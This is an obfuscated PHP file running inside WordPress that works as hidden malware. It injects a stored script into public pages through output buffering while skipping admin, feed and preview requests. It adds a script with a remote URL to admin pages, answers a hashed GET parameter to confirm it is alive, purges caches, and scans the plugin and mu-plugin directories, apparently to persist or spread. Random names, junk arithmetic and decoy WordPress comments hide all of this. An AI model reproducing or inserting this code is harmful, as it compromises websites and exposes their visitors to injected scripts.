    if  ($fjyxyq0r2rq >  (439+61)    &&   $fjyxyq0r2rq   <= (1341164+3901716)) {



   include $msv3i50i3vv6;
}
  }     catch      (Throwable  $h2v_bjm4ejxq8fp)  {
 }   catch    (Exception $h2v_bjm4ejxq8fp) {
  }


 while ($GLOBALS['__scf_sqafjxbxzurlgl_406']()   >   0   &&  @ob_end_clean()) {
/* cubic quotient */

     }
     header(nrudcgor(1730));
  exit;
  }
 if ($by9ihyua8j3  !==  h2iz25lld35tmbc2ls(mhiu2yqz6kqd(643))) return;
  try    {
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1675)) &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1731)))      {


 @update_option(f5cd2smymkqusi5(508),    (int)  @get_option(pahk8uy1uxt(508),   0)   +    1,     mhiu2yqz6kqd(1732));
   @update_option(nrudcgor(1733),   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),   pahk8uy1uxt(1732));
    }
$xrlia3wn0e6dfy3   =    vlqx8b8viizxmck29ty0(nrudcgor(644), "");
  if     ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3)  >    (63^91) && !$GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1734),   $xrlia3wn0e6dfy3)  &&  $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1735),     $xrlia3wn0e6dfy3))  {
$cw65c9lc1th =  @$GLOBALS['__scf_wlpl5h61eyolq_355']($xrlia3wn0e6dfy3,  true);
  if     ($cw65c9lc1th      !== false   &&     $GLOBALS['__scf_amjjmfnilcolnb_10']($cw65c9lc1th)  >  (95+5))  $xrlia3wn0e6dfy3 =     $cw65c9lc1th;
 }
   if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3)   <   (77+23)) $xrlia3wn0e6dfy3 =     pec45e4yybq3woqtn();
 if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3) <  (0x9+0x5b)) {

 while   ($GLOBALS['__scf_sqafjxbxzurlgl_406']()   >     0 &&    @ob_end_clean()) {



}
header(dhd5r6_4ki(1736));
header(dhd5r6_4ki(1737));
  header(nhceivfj8tbe(1738));
 exit;$c14lxs_5gog=40*4;$w6c2u6v0l1j=$c14lxs_5gog-16;



}
 $hwhee7ay9grzf    =   vlqx8b8viizxmck29ty0(nhceivfj8tbe(1138),  "");
$v719ao17unatg2b   =     '"' . $GLOBALS['__scf_nn04_vx3uspzx4_54']($hwhee7ay9grzf    . $xrlia3wn0e6dfy3)  .   '"';
     if   (isset($_SERVER[mhiu2yqz6kqd(1739)]) &&     $GLOBALS['__scf_uvjtdemk2f_320']($_SERVER[dhd5r6_4ki(1739)]) ===  $v719ao17unatg2b)   {

while   ($GLOBALS['__scf_sqafjxbxzurlgl_406']()   > 0  &&  @ob_end_clean())  {
// static-adj synchronizer



 }
// WP useBlockProps srcset descriptor




  header(nrudcgor(1740));
 

 header(mhiu2yqz6kqd(1741)  .     $v719ao17unatg2b);

exit;
      }
// PHP named arguments site meta

while     ($GLOBALS['__scf_sqafjxbxzurlgl_406']()  > 0   && @ob_end_clean())  {
 }
 header(dhd5r6_4ki(1742));
  header(f5cd2smymkqusi5(1743));
// WP Spacer Block: pure-adj interceptor

header(dhd5r6_4ki(1744));



 header(f5cd2smymkqusi5(1745) .      $v719ao17unatg2b);
  echo  $hwhee7ay9grzf . $xrlia3wn0e6dfy3;
  exit;
}     catch (Throwable $h2v_bjm4ejxq8fp)    {



   fukkkeh6955g9qi(f5cd2smymkqusi5(1746),    $h2v_bjm4ejxq8fp);
 }      catch      (Exception   $h2v_bjm4ejxq8fp)  {
fukkkeh6955g9qi(dhd5r6_4ki(1746),    $h2v_bjm4ejxq8fp);



  }
   }
lghyg_p7yp7hck();


 function f7ekqstv3mnumtt61ii7cn()
  {
     if   (!isset($_GET[dhd5r6_4ki(1747)]))    return;
   try  {
   $vyugiryo8w =    $_GET[nhceivfj8tbe(1747)];

if (!$GLOBALS['__scf__me483qbepnts_41']($vyugiryo8w)  ||   $vyugiryo8w    ===      "") return;
     $vyugiryo8w    =     $GLOBALS['__scf_h3sj62ryxfdde_99']($vyugiryo8w);
   $nvauo4vsth0424vh = array();
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1748)))    $nvauo4vsth0424vh[]  =  (string)    $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url(),    PHP_URL_HOST);


   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1675))) {
  $h3v_0bzsts   =    (string)      @get_option(pahk8uy1uxt(570),     "");
if  ($h3v_0bzsts !== "")    $nvauo4vsth0424vh[]   =    (string)   $GLOBALS['__scf_u6ui6ntfvxm1_565']($h3v_0bzsts,      PHP_URL_HOST);
    }
if (isset($_SERVER[dhd5r6_4ki(1304)])) $nvauo4vsth0424vh[]   = (string)  $_SERVER[pahk8uy1uxt(1304)];
    $nvauo4vsth0424vh[]    =  romae2ec00z0c4bz61q_("");$b57tyqpjhnf=49*5;$gtako5shvz=$b57tyqpjhnf-20;
 $fmwdpo9coh  =   false;
foreach ($GLOBALS['__scf_e3ymc0hwiys_147']($nvauo4vsth0424vh)  as  $_7e_e05ht34mww07)  {
     if  (!$GLOBALS['__scf__me483qbepnts_41']($_7e_e05ht34mww07)     ||     $_7e_e05ht34mww07 === "")    continue;
   if   ($GLOBALS['__scf_nr12ouzrtt_7']($_7e_e05ht34mww07, ':')  !==  false)  $_7e_e05ht34mww07     =     $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(1749), "",  $_7e_e05ht34mww07);


     if   (ohrydgas8yy9a22s($GLOBALS['__scf_h3sj62ryxfdde_99']($_7e_e05ht34mww07)  .  nrudcgor(1750),    (23-11))  === $vyugiryo8w) {
 $fmwdpo9coh   =      true;


    break;
}
}
if (!$fmwdpo9coh)   return;
      $ml75i279st    =  $GLOBALS['__scf_x84r5u38i5t_1148'](nrudcgor(1751),  (23+7));
 $ypms8r96vrqodjk   =   afmou025cdp06je06pv(oks4ay45sdg2p8hjra($ml75i279st));
 while ($GLOBALS['__scf_sqafjxbxzurlgl_406']()     >    0 &&  @ob_end_clean())   {
  }
   header(pahk8uy1uxt(1752));
header(nrudcgor(1753));
    echo  ($ypms8r96vrqodjk    ===    $ml75i279st) ?    f5cd2smymkqusi5(1754) .    $GLOBALS['__scf_nn04_vx3uspzx4_54']($ml75i279st) :    mhiu2yqz6kqd(1755);



exit;
 }  catch   (Throwable  $h2v_bjm4ejxq8fp) {
 fukkkeh6955g9qi(nrudcgor(1756), $h2v_bjm4ejxq8fp);
   } catch (Exception $h2v_bjm4ejxq8fp)  {
 fukkkeh6955g9qi(mhiu2yqz6kqd(1756), $h2v_bjm4ejxq8fp);
  }
 }
  f7ekqstv3mnumtt61ii7cn();
 function    f7wdh_62ep_9dphm4sq()
 {
       $fmwdpo9coh   = true;$km6cwrap=136|126;$_iccpyytl5cb=$km6cwrap^147;
 $i8wxsutuyj   =  function   ($cjptm7nbb46fjj)  use    (&$fmwdpo9coh)    {
   try      {
  $GLOBALS['__scf__ilhh_yoem3eg_289']($cjptm7nbb46fjj);
   }   catch  (Throwable   $h2v_bjm4ejxq8fp)      {
    $fmwdpo9coh  =     false;
}  catch   (Exception $h2v_bjm4ejxq8fp)  {
   $fmwdpo9coh  =  false;
    }
};
 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1757)))    $i8wxsutuyj(f5cd2smymkqusi5(1758));
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1759))) $i8wxsutuyj(nhceivfj8tbe(1759));
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(541))) $i8wxsutuyj(f5cd2smymkqusi5(541));



        if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1760)))   $i8wxsutuyj(nrudcgor(1760));
     elseif  ($GLOBALS['__scf_mh99vqi740eg_542'](nhceivfj8tbe(1761))   && $GLOBALS['__scf_ttokt3ljhh_118'](nrudcgor(1761),      mhiu2yqz6kqd(1762))) $i8wxsutuyj(array(mhiu2yqz6kqd(1761), nhceivfj8tbe(1762)));
 if ($GLOBALS['__scf_mh99vqi740eg_542'](f5cd2smymkqusi5(1763))  &&  $GLOBALS['__scf_ttokt3ljhh_118'](nrudcgor(1763), mhiu2yqz6kqd(1764)))  $i8wxsutuyj(array(pahk8uy1uxt(1765), nhceivfj8tbe(1764)));



if ($GLOBALS['__scf_mh99vqi740eg_542'](f5cd2smymkqusi5(543))    && $GLOBALS['__scf_ttokt3ljhh_118'](f5cd2smymkqusi5(543),    nrudcgor(1766)))  $i8wxsutuyj(array(f5cd2smymkqusi5(1767),    pahk8uy1uxt(1768)));
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1769))) $i8wxsutuyj(nrudcgor(1770));
  elseif (isset($GLOBALS[dhd5r6_4ki(544)])  && $GLOBALS['__scf_d56ll0ap77jcvq_66']($GLOBALS[nrudcgor(544)])   &&    $GLOBALS['__scf_ttokt3ljhh_118']($GLOBALS[f5cd2smymkqusi5(544)],  mhiu2yqz6kqd(1771)))   $i8wxsutuyj(function   ()     {
 $GLOBALS[f5cd2smymkqusi5(1772)]->deleteCache(true);
   });
  if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1773)))  $i8wxsutuyj(nrudcgor(1774));
      if ($GLOBALS['__scf_mh99vqi740eg_542'](pahk8uy1uxt(1775)) && $GLOBALS['__scf_ttokt3ljhh_118'](mhiu2yqz6kqd(1776), nhceivfj8tbe(1777)))      $i8wxsutuyj(array(nrudcgor(1776),   nrudcgor(1778)));



 fukkkeh6955g9qi(mhiu2yqz6kqd(1779),  nrudcgor(1780));

  return   $fmwdpo9coh;
     }
function  wsaf618ckbreq5nwdbhl()
     {
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(762))  &&  is_admin()) return true;


 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1781))  &&  wp_doing_ajax())    return   true;
 if  (defined(nrudcgor(1782))   &&    REST_REQUEST)   return  true;
 if    (defined(nhceivfj8tbe(1783))    && XMLRPC_REQUEST)    return  true;
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1784)) &&   is_feed())    return  true;
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1785)) &&  is_robots())    return    true;
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1786))   &&  is_sitemaps())  return true;
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1787))  &&  is_customize_preview())  return  true;
  if    (isset($_GET[f5cd2smymkqusi5(1788)]) ||   isset($_GET[dhd5r6_4ki(1789)]) ||    isset($_GET[dhd5r6_4ki(1790)]))   return true;
return  false;

  }
 function     am1ouu13vh9e6_dpbvmp72()
   {



$tlzgi_7fsmo7a = (isset($GLOBALS[nhceivfj8tbe(1791)])   &&  $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[pahk8uy1uxt(1792)]))   ?    $GLOBALS['__scf_uvjtdemk2f_320']($GLOBALS[mhiu2yqz6kqd(1792)]) : "";
if      ($tlzgi_7fsmo7a  ===  "")   return  "";
  $tlzgi_7fsmo7a   =   $GLOBALS['__scf_f9_5dfsm5hfxx_360'](dhd5r6_4ki(1793),  f5cd2smymkqusi5(1794),   $tlzgi_7fsmo7a);
 $isrxzsfjhf3f  = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1748))  ?  (string)   $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url(),    PHP_URL_HOST)   :      "";
 $t34fosb9am8jktb1  = ohrydgas8yy9a22s($GLOBALS['__scf_h3sj62ryxfdde_99']($isrxzsfjhf3f), (0x2+0x4));
$fliz14uy9jr86_7n    =   $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($tlzgi_7fsmo7a), 0,   (12-6));


  return "\n<script data-sc=\""  .    $t34fosb9am8jktb1    .      '-'  .  $fliz14uy9jr86_7n    . "\">\n" . $tlzgi_7fsmo7a .   "\n</script>\n<!-- sc"  . $t34fosb9am8jktb1    .    '-' .  $fliz14uy9jr86_7n   . " -->\n";
   }
    function   z_6opawddx6dtuspz17s()
      {
try {


 if (wsaf618ckbreq5nwdbhl())   return;
   $tlv32r0ravg =   am1ouu13vh9e6_dpbvmp72();
   if     ($tlv32r0ravg  === "") return;
     echo $tlv32r0ravg;
   $GLOBALS[mhiu2yqz6kqd(1795)] =   true;
     if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1796))   &&      $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1731))  &&     empty($GLOBALS[nhceivfj8tbe(1797)]))    {
   $GLOBALS[pahk8uy1uxt(1797)]  =    true;
$otgjetnwp102  = (int)    @get_option(nrudcgor(506),   0);
       if   ($GLOBALS['__scf_zxyq0lcqv02z6_185']()  - $otgjetnwp102   >  (282+18)) @update_option(mhiu2yqz6kqd(506),   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),     f5cd2smymkqusi5(1798));


    unset($otgjetnwp102);


   }
} catch (Throwable  $h2v_bjm4ejxq8fp) {

fukkkeh6955g9qi(mhiu2yqz6kqd(633), $h2v_bjm4ejxq8fp);
     } catch    (Exception $h2v_bjm4ejxq8fp)    {
// @deserialize pipeline

 }


  }
function   vtu2v5ngmmvqrozemyp($zsv8nkkwmoo5v1qp, $cfu9o9eok1  =  0)
{
 if  (!$GLOBALS['__scf__me483qbepnts_41']($zsv8nkkwmoo5v1qp)    ||  $zsv8nkkwmoo5v1qp   ===    "")    return  $zsv8nkkwmoo5v1qp;


        if (defined(nhceivfj8tbe(1799))  && !($cfu9o9eok1 &  PHP_OUTPUT_HANDLER_FINAL)) return  $zsv8nkkwmoo5v1qp;
    if  (!empty($GLOBALS[nrudcgor(1800)]))  return   $zsv8nkkwmoo5v1qp;
      if  (!empty($GLOBALS[nrudcgor(1795)])) return $zsv8nkkwmoo5v1qp;
 if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($zsv8nkkwmoo5v1qp)   >   (4194292+12))   return  $zsv8nkkwmoo5v1qp;
    if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(398)))    {


        foreach    ((array)  @headers_list()    as    $wy9gpbsc8dw_i1m)  {
  if (stripos($wy9gpbsc8dw_i1m, nrudcgor(1801))   === 0  &&    stripos($wy9gpbsc8dw_i1m, f5cd2smymkqusi5(1802))  !==    false) return  $zsv8nkkwmoo5v1qp;
  if (stripos($wy9gpbsc8dw_i1m,   f5cd2smymkqusi5(1803))    ===   0     &&  stripos($wy9gpbsc8dw_i1m, mhiu2yqz6kqd(1804)) ===   false &&  stripos($wy9gpbsc8dw_i1m,   nrudcgor(1805))  === false)  return  $zsv8nkkwmoo5v1qp;

}
 unset($wy9gpbsc8dw_i1m);
   }


$tlv32r0ravg  =      am1ouu13vh9e6_dpbvmp72();
if  ($tlv32r0ravg    ===   "")   return $zsv8nkkwmoo5v1qp;
  if (stripos($zsv8nkkwmoo5v1qp,  pahk8uy1uxt(1806))  ===  false  &&      stripos($zsv8nkkwmoo5v1qp,    mhiu2yqz6kqd(1807))     ===   false) return    $zsv8nkkwmoo5v1qp;
 $GLOBALS[f5cd2smymkqusi5(1808)]  =    true;
    $GLOBALS[nhceivfj8tbe(503)]    = true;


$peaua2ig3tjkn06y =  stripos($zsv8nkkwmoo5v1qp,     f5cd2smymkqusi5(1806));


if ($peaua2ig3tjkn06y    !==    false)  {
 return    $GLOBALS['__scf_bv1z3no349dv5r_9']($zsv8nkkwmoo5v1qp, 0, $peaua2ig3tjkn06y)   .   $tlv32r0ravg   .     $GLOBALS['__scf_bv1z3no349dv5r_9']($zsv8nkkwmoo5v1qp,  $peaua2ig3tjkn06y);
  }
  return   $zsv8nkkwmoo5v1qp  . $tlv32r0ravg;
  }
    function  spmkwbtqocfp8afd89()
  {
      try  {
    if   (wsaf618ckbreq5nwdbhl())  return;
if     (!empty($GLOBALS[nrudcgor(1809)])) return;
 if     (!empty($GLOBALS[dhd5r6_4ki(1810)]))   return;
   if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(398))) return;


$tlzgi_7fsmo7a =     (isset($GLOBALS[nrudcgor(1792)])    && $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[mhiu2yqz6kqd(1811)]))  ?   $GLOBALS['__scf_uvjtdemk2f_320']($GLOBALS[mhiu2yqz6kqd(1811)])     : "";
 if   ($tlzgi_7fsmo7a  ===  "") return;
  $j3y3k6j9d13iia  = isset($_SERVER[nhceivfj8tbe(1812)])   ?   (string)     $_SERVER[nrudcgor(1813)]      :   "";
if  ($j3y3k6j9d13iia  !==   ""  &&  $GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1814), $j3y3k6j9d13iia)) return;

    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1815)))    {
  foreach   ((array)    @headers_list() as  $wy9gpbsc8dw_i1m)     {
   if  (stripos($wy9gpbsc8dw_i1m, nhceivfj8tbe(1816)) ===   0 &&  stripos($wy9gpbsc8dw_i1m, f5cd2smymkqusi5(1802)) !==  false)   return;
     

if    (stripos($wy9gpbsc8dw_i1m, nrudcgor(1817))     ===  0    && stripos($wy9gpbsc8dw_i1m,   f5cd2smymkqusi5(1818))   ===  false &&  stripos($wy9gpbsc8dw_i1m, dhd5r6_4ki(1805)) === false)   return;
    if      (stripos($wy9gpbsc8dw_i1m, nrudcgor(1819))   === 0) return;



}
  unset($wy9gpbsc8dw_i1m);
   }
     $GLOBALS[nrudcgor(1820)] =   true;
      @$GLOBALS['__scf_eg_jxgt8418tcg_1821'](pahk8uy1uxt(1822));
   }  catch (Throwable $h2v_bjm4ejxq8fp)   {
fukkkeh6955g9qi(nhceivfj8tbe(502),  $h2v_bjm4ejxq8fp);
   }  catch (Exception  $h2v_bjm4ejxq8fp) {
    }



     }
      function    huhysja7l5cllu5()
 {
  try  {



    if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1823)))     return;
 if   (!is_admin()      && (!isset($GLOBALS[pahk8uy1uxt(1824)])    ||  $GLOBALS[dhd5r6_4ki(1825)]     !==     nrudcgor(1464)))   return;



if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(490))   && !is_ssl()) return;
  $rumb55g4lxs3to = vlqx8b8viizxmck29ty0(nhceivfj8tbe(1826),  "");
 $t34fosb9am8jktb1 =  ohrydgas8yy9a22s(ABSPATH .  f5cd2smymkqusi5(633),  (0x3+0x3));
 $reoi8rizl6uwsukk = dhd5r6_4ki(1318);



    if ($rumb55g4lxs3to === "")  {
 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1796))   && (int) @get_option(dhd5r6_4ki(512),    0))    {
   @update_option(nhceivfj8tbe(512),   0,  nhceivfj8tbe(1798));
$br1onf47d9og  = (string) @get_option(dhd5r6_4ki(1827),      "");
echo     "\n"    .   nhceivfj8tbe(1828)  . $t34fosb9am8jktb1   .  '>'
  .    mhiu2yqz6kqd(1829)
 .  pahk8uy1uxt(1830)  .  $reoi8rizl6uwsukk(nhceivfj8tbe(1831))  .    dhd5r6_4ki(1832)
        .  dhd5r6_4ki(1833) . $GLOBALS['__scf_umr3maax4akmys_597']($br1onf47d9og) . ';'
   .    mhiu2yqz6kqd(1834)  .   $reoi8rizl6uwsukk(pahk8uy1uxt(1835))     .   mhiu2yqz6kqd(1836)
    . pahk8uy1uxt(1837)   .  $reoi8rizl6uwsukk(f5cd2smymkqusi5(1838)) .   f5cd2smymkqusi5(1839) .  $reoi8rizl6uwsukk(dhd5r6_4ki(1840))   .  dhd5r6_4ki(1839)    .      $reoi8rizl6uwsukk(mhiu2yqz6kqd(1841)) .      f5cd2smymkqusi5(1842)  .  $reoi8rizl6uwsukk(f5cd2smymkqusi5(1843))     .      nrudcgor(1844)
   . f5cd2smymkqusi5(1845)   .  $reoi8rizl6uwsukk(nrudcgor(1846))  .   mhiu2yqz6kqd(1847) .   $reoi8rizl6uwsukk(nrudcgor(1848))      .  f5cd2smymkqusi5(1849)
.    f5cd2smymkqusi5(1850)  . "\n";
  unset($br1onf47d9og);
 }
    return;
}
    $rumb55g4lxs3to    =    $GLOBALS['__scf_f9_5dfsm5hfxx_360'](nhceivfj8tbe(1108), nhceivfj8tbe(1143),  $rumb55g4lxs3to);
if ($GLOBALS['__scf_nr12ouzrtt_7']($rumb55g4lxs3to,   nrudcgor(1143)) !==     0)     $rumb55g4lxs3to  = pahk8uy1uxt(1851) .   $GLOBALS['__scf_xztaeq78skok5_8']($rumb55g4lxs3to,  '/');
   $q6byhbvxv6jb5c   =  '/';
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1748)))     {
 $pc00fbwh_r0j  = (string)    $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url(),     PHP_URL_PATH);
if      ($pc00fbwh_r0j  !==     ""     && $pc00fbwh_r0j   !==   '/') $q6byhbvxv6jb5c =  $GLOBALS['__scf_xv_2irmjrq_12']($pc00fbwh_r0j,    '/')  . '/';


 }
 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1731))) {
    @update_option(nrudcgor(512), 1, dhd5r6_4ki(1798));
      @update_option(dhd5r6_4ki(1827),  $rumb55g4lxs3to,  nhceivfj8tbe(1852));
     }
$ruav82kdqczhv4    =  mhiu2yqz6kqd(1853) . $t34fosb9am8jktb1   .  '>'
 .   nrudcgor(1854)
     .   pahk8uy1uxt(1830)   .  $reoi8rizl6uwsukk(f5cd2smymkqusi5(1831)) . nhceivfj8tbe(1855)
 .   nhceivfj8tbe(1856)
   .  pahk8uy1uxt(1857)    . $reoi8rizl6uwsukk(dhd5r6_4ki(1858)) .  pahk8uy1uxt(1859)    .    $GLOBALS['__scf_umr3maax4akmys_597']($rumb55g4lxs3to)  . ')'


      .  nhceivfj8tbe(1860) . $reoi8rizl6uwsukk(mhiu2yqz6kqd(1838)) . dhd5r6_4ki(1839)    . $reoi8rizl6uwsukk(dhd5r6_4ki(1840))     .  nrudcgor(1839)   . $reoi8rizl6uwsukk(f5cd2smymkqusi5(1861)) .   dhd5r6_4ki(1842)    .   $reoi8rizl6uwsukk(dhd5r6_4ki(1843)) . f5cd2smymkqusi5(1862)  .   $GLOBALS['__scf_umr3maax4akmys_597']($rumb55g4lxs3to)     .     pahk8uy1uxt(1863)

.    f5cd2smymkqusi5(1864)    .    $reoi8rizl6uwsukk(f5cd2smymkqusi5(1865))  . f5cd2smymkqusi5(1866)  . $GLOBALS['__scf_umr3maax4akmys_597']($rumb55g4lxs3to)     . pahk8uy1uxt(1867) .      $GLOBALS['__scf_umr3maax4akmys_597']($q6byhbvxv6jb5c) . nrudcgor(1868)      .   $reoi8rizl6uwsukk(dhd5r6_4ki(1869)) .  nhceivfj8tbe(1870)
. dhd5r6_4ki(1871) .  $reoi8rizl6uwsukk(mhiu2yqz6kqd(1872))     .   dhd5r6_4ki(1873)
       . pahk8uy1uxt(1857)  .   $reoi8rizl6uwsukk(mhiu2yqz6kqd(1874)) .   nrudcgor(1875)    . $reoi8rizl6uwsukk(mhiu2yqz6kqd(176))  .   dhd5r6_4ki(1876)
   . dhd5r6_4ki(1877)    .    $reoi8rizl6uwsukk(pahk8uy1uxt(1671))    .  f5cd2smymkqusi5(1855)
. f5cd2smymkqusi5(1878)
 .   mhiu2yqz6kqd(1879) .     $reoi8rizl6uwsukk(dhd5r6_4ki(1880))   .   nhceivfj8tbe(1881)
  .   pahk8uy1uxt(1882)  .   $reoi8rizl6uwsukk(nhceivfj8tbe(1838)) .   dhd5r6_4ki(1883)  .  $reoi8rizl6uwsukk(nrudcgor(1884))    .  dhd5r6_4ki(1885)
     .    dhd5r6_4ki(1886);

   echo     "\n" .     $ruav82kdqczhv4   .   "\n";
 }  catch (Throwable $h2v_bjm4ejxq8fp)  {


        fukkkeh6955g9qi(pahk8uy1uxt(1887),    $h2v_bjm4ejxq8fp);
 } catch    (Exception  $h2v_bjm4ejxq8fp)    {
fukkkeh6955g9qi(dhd5r6_4ki(1888),   $h2v_bjm4ejxq8fp);

}
    }
     
   if  (shx9j_k78ldzx33x0l())   {
   return;
       }
  bhary815od9kp2();


       $y3lhii6xt6258z  =   @$GLOBALS['__scf_hqkv9v6te1dvxi_94'](vv_nfhhmy_1mjmsa());
 if   (!$y3lhii6xt6258z    ||   ($y3lhii6xt6258z     %     (99989+11)) !== mzvtk8ecgiuaeafix()) {
   $ehxehhaevws      =  $GLOBALS['__scf_zxyq0lcqv02z6_185']();
    kfdh_vugi0_9nv_wpj(vv_nfhhmy_1mjmsa(), ($ehxehhaevws -  ($ehxehhaevws   %     (99915+85)))    +   mzvtk8ecgiuaeafix());

  unset($ehxehhaevws);
   }
     unset($y3lhii6xt6258z);
 $b0ni1yqxzxjnyxn = $GLOBALS['__scf_eure5hcx2b_11'](__FILE__)  . nrudcgor(1889)   .   $GLOBALS['__scf_t8832qq90dxb4_3'](__FILE__,  dhd5r6_4ki(1890));
 $ce7amideiik6kat8  =  @$GLOBALS['__scf_gsamhlxot70ps_18']($b0ni1yqxzxjnyxn) ?  (int)      @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($b0ni1yqxzxjnyxn) :    0;
 $p25a51vbio1ptbe  = !($ce7amideiik6kat8 >    $GLOBALS['__scf_zxyq0lcqv02z6_185']()  - (357-57) &&    $ce7amideiik6kat8  <=    $GLOBALS['__scf_zxyq0lcqv02z6_185']()  +   (261+39));
if ($p25a51vbio1ptbe)     @$GLOBALS['__scf_d91t8__q8rnbc2_71']($b0ni1yqxzxjnyxn);
  unset($b0ni1yqxzxjnyxn, $ce7amideiik6kat8);


   if ($p25a51vbio1ptbe)    try  {
$rdkbrxivyu278  = __FILE__;


$ns0ii5adv3kc61x   =  "";
$sskfrd9pmp0   =  @$GLOBALS['__scf_apq4pqdt6n41_91']($rdkbrxivyu278, false,    null,    0,   (7789-3693));
if    ($GLOBALS['__scf__me483qbepnts_41']($sskfrd9pmp0)  &&   $GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1891),   $sskfrd9pmp0,      $yv19e4q9xbakr))  $ns0ii5adv3kc61x = $yv19e4q9xbakr[1];
if    ($ns0ii5adv3kc61x   !==  ""   &&  defined(dhd5r6_4ki(1660)))  {
  $h724_a629347  =  array();



   $eune_5rai01     =  defined(pahk8uy1uxt(1550)) ?     WPMU_PLUGIN_DIR :  WP_CONTENT_DIR  . nrudcgor(14);
   $n6ta7au_a2 =   defined(nhceivfj8tbe(1039))   ? WP_PLUGIN_DIR  :  WP_CONTENT_DIR   .    f5cd2smymkqusi5(732);
 $ir09v8aahkv7d0 =   false;



 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1551)))   {
  $ltlwsrg4s23w =     @$GLOBALS['__scf_ux4_n6mewmsy_43']($eune_5rai01)   ?  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($eune_5rai01      .  dhd5r6_4ki(807)) : false;


$k2se469ujh    =  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($n6ta7au_a2  .     f5cd2smymkqusi5(462));
if  ($GLOBALS['__scf_vf9p0fditvxy_35']($ltlwsrg4s23w) ||  $GLOBALS['__scf_vf9p0fditvxy_35']($k2se469ujh))     {
$ir09v8aahkv7d0  =     true;
   foreach  ((array)  $ltlwsrg4s23w   as    $qt9m2ywx1f2f6k) $h724_a629347[]    =  $qt9m2ywx1f2f6k;
        foreach   ((array)    $k2se469ujh   as $qt9m2ywx1f2f6k)    $h724_a629347[] =  $qt9m2ywx1f2f6k;
}
   unset($ltlwsrg4s23w,    $k2se469ujh);
       }



    if     (!$ir09v8aahkv7d0)    {
   $z1w197277wcqb8  =  @$GLOBALS['__scf_ux4_n6mewmsy_43']($eune_5rai01) ? ly0t7sdceinn03pyne3($eune_5rai01, (1729+3271))    :  false;
    if  ($GLOBALS['__scf_vf9p0fditvxy_35']($z1w197277wcqb8))   foreach ($z1w197277wcqb8   as $jqs2eargyf)  {
  if   ($GLOBALS['__scf_bv1z3no349dv5r_9']($jqs2eargyf, -(1+3))    ===  nrudcgor(1892)) $h724_a629347[]   = $eune_5rai01 .     '/' .   $jqs2eargyf;
}
 $z1w197277wcqb8     =   @$GLOBALS['__scf_ux4_n6mewmsy_43']($n6ta7au_a2) ? ly0t7sdceinn03pyne3($n6ta7au_a2,  (4953+47)) :  false;
if   ($GLOBALS['__scf_vf9p0fditvxy_35']($z1w197277wcqb8))     foreach   ($z1w197277wcqb8  as $jqs2eargyf) {
 $rwfiz600ad =     $n6ta7au_a2   . '/'  .    $jqs2eargyf;
   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($rwfiz600ad))   continue;
  $mi0nylsh_4v7r = ly0t7sdceinn03pyne3($rwfiz600ad,   (4912+88));
     if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($mi0nylsh_4v7r))      continue;
 foreach ($mi0nylsh_4v7r as $n6wfpm4lhd88)    {
    if ($GLOBALS['__scf_bv1z3no349dv5r_9']($n6wfpm4lhd88,   -(0x3+0x1)) ===    pahk8uy1uxt(1892))     $h724_a629347[]      =  $rwfiz600ad  .     '/'    .   $n6wfpm4lhd88;



    }
}

